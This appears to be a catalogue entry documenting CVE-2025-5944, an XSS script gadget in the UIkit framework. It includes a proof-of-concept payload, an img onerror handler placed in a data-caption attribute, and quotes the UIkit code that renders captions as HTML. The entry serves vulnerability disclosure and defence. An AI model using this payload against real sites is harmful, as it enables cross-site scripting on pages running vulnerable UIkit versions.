---
description: A lightweight and modular front-end framework for developing fast and powerful web interfaces.
github: uikit/uikit
gadgets:
  ≥2.18.0:
    cve: CVE-2025-5944
    authors:
      - github:maudud-bdthemes
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - a-tag
      - data-attr
      - any-timing
    pocs:
      - description: The [uikit](https://github.com/uikit/uikit) library uses the `data-caption` attribute to inject HTML content. Because the event that triggers this behavior is delegated from the document, it can be activated at any time. (This also applies to elements using the `uk-lightbox` attribute directly)
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.23.11/js/uikit.min.js"></script>

          <!-- user input -->
          <x data-uk-lightbox>
            <a data-caption="<img src=x onerror=alert(document.domain);>">Click Me</a>
          </x>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/uikit/uikit/blob/0d7a36576ccb0aec048b3c4ed62eca4ebee9aab0/src/js/util/event.js#L87">https://github.com/uikit/uikit/blob/0d7a36576ccb0aec048b3c4ed62eca4ebee9aab0/src/js/util/event.js#L87</a>

      ```javascript
      function delegate(selector, listener) {
          return (e) => {
              const current =
                  selector[0] === '>'
                      ? findAll(selector, e.currentTarget)
                            .reverse()
                            .find((element) => element.contains(e.target))
                      : e.target.closest(selector);

              if (current) {
                  e.current = current;
                  listener.call(this, e);
                  delete e.current;
              }
          };
      }
      ```

      Source: <a target="_blank" href="https://github.com/uikit/uikit/blob/0d7a36576ccb0aec048b3c4ed62eca4ebee9aab0/src/js/components/lightbox-panel.js#L237">https://github.com/uikit/uikit/blob/0d7a36576ccb0aec048b3c4ed62eca4ebee9aab0/src/js/components/lightbox-panel.js#L237</a>

      ```javascript
      handler(e) {
          html($(this.selCaption, this.$el), this.getItem().caption || '');
          html(
              $(this.selCounter, this.$el),
              this.t('counter', this.index + 1, this.slides.length),
          );

          for (let j = -this.preload; j <= this.preload; j++) {
              this.loadItem(this.index + j);
          }

          if (this.isToggled()) {
              return;
          }

          this.draggable = false;

          e.preventDefault();

          this.toggleElement(this.$el, true, false);

          this.animation = Animations.scale;
          removeClass(e.target, this.clsActive);
          this.stack.splice(1, 0, this.index);
      },
      ```
    links:
      - https://github.com/uikit/uikit/issues/5162
      - https://security.snyk.io/vuln/SNYK-JS-UIKIT-10587793
---
